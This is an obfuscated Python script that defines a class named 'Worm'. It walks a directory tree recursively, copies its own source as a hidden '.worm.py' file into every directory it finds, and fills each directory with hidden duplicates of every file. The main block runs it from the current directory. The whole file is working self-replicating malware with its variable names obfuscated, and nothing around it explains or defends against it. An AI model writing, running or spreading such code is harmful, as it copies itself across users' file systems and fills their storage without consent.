import os #line:1
import shutil #line:2
class Worm :#line:4
    def __init__ (OOOO0OO000O00O00O ,path =None ,target_dir_list =None ,iteration =None ):#line:6
        if isinstance (path ,type (None )):#line:7
            OOOO0OO000O00O00O .path ="/"#line:8
        else :#line:9
            OOOO0OO000O00O00O .path =path #line:10
        if isinstance (target_dir_list ,type (None )):#line:12
            OOOO0OO000O00O00O .target_dir_list =[]#line:13
        else :#line:14
            OOOO0OO000O00O00O .target_dir_list =target_dir_list #line:15
        if isinstance (target_dir_list ,type (None )):#line:17
            OOOO0OO000O00O00O .iteration =2 #line:18
        else :#line:19
            OOOO0OO000O00O00O .iteration =iteration #line:20
        OOOO0OO000O00O00O .own_path =os .path .realpath (__file__ )#line:22
    def l (O00O0O0O0O00OOO0O ,O0O0O000OOOOOO00O ):#line:24
        O00O0O0O0O00OOO0O .target_dir_list .append (O0O0O000OOOOOO00O )#line:25
        O0O00OOO00O000000 =os .listdir (O0O0O000OOOOOO00O )#line:26
        for O000O00OO00OOO00O in O0O00OOO00O000000 :#line:28
            if not O000O00OO00OOO00O .startswith ('.'):#line:30
                OO0O0OO00OO0O0OOO =os .path .join (O0O0O000OOOOOO00O ,O000O00OO00OOO00O )#line:32
                print (OO0O0OO00OO0O0OOO )#line:33
                if os .path .isdir (OO0O0OO00OO0O0OOO ):#line:35
                    O00O0O0O0O00OOO0O .l (OO0O0OO00OO0O0OOO )#line:36
                else :#line:37
                    pass #line:38
    def n (O0O0O0OOOO0000O0O ):#line:40
        for OOO000O00O0OO0OO0 in O0O0O0OOOO0000O0O .target_dir_list :#line:41
            OO00000000OOOOO0O =os .path .join (OOO000O00O0OO0OO0 ,".worm.py")#line:42
            shutil .copyfile (O0O0O0OOOO0000O0O .own_path ,OO00000000OOOOO0O )#line:44
    def c (O00O0O0O0OOOO0OOO ):#line:46
        for O0000O0000O0O0O00 in O00O0O0O0OOOO0OOO .target_dir_list :#line:47
            O00OO0O0OOOO0OO0O =os .listdir (O0000O0000O0O0O00 )#line:48
            for O0OO000O0O0OO0O0O in O00OO0O0OOOO0OO0O :#line:49
                O00OOO0OO00OO000O =os .path .join (O0000O0000O0O0O00 ,O0OO000O0O0OO0O0O )#line:50
                if not O00OOO0OO00OO000O .startswith ('.')and not os .path .isdir (O00OOO0OO00OO000O ):#line:51
                    OOOOOO000OO000000 =O00OOO0OO00OO000O #line:52
                    for OO00000O0O0OO000O in range (O00O0O0O0OOOO0OOO .iteration ):#line:53
                        OO0OOO00O00OOOO0O =os .path .join (O0000O0000O0O0O00 ,("."+O0OO000O0O0OO0O0O +str (OO00000O0O0OO000O )))#line:54
                        shutil .copyfile (OOOOOO000OO000000 ,OO0OOO00O00OOOO0O )#line:55
    def s (OOOO0O0OOO00O00OO ):#line:57
        OOOO0O0OOO00O00OO .l (OOOO0O0OOO00O00OO .path )#line:58
        print (OOOO0O0OOO00O00OO .target_dir_list )#line:59
        OOOO0O0OOO00O00OO .n ()#line:60
        OOOO0O0OOO00O00OO .c ()#line:61
if __name__ =="__main__":#line:63
    current_directory =os .path .abspath ("")#line:64
    worm =Worm (path =current_directory )#line:65
    worm .s ()
